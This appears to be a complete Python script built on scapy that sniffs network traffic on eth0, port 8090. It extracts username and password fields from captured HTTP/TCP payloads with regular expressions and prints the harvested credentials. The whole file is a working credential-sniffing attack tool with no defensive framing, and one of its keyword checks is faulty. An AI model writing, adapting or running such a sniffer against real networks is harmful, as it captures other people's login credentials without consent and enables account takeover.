import scapy.all as scapy
from scapy.layers import http
import re

login_credentials = {}
def sniff(interface: str):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 8090")


# Field in the layers are accessed using the dot operator
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)

    if packet.haslayer(scapy.TCP):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if "username" and "password" in str(load):
                # print(load)
                username = re.findall(r"username=([^&]+)", str(load))
                password = re.findall(r"password=([^&]+)", str(load))
                login_credentials[username[0]] = password[0]
                print(login_credentials)



sniff("eth0")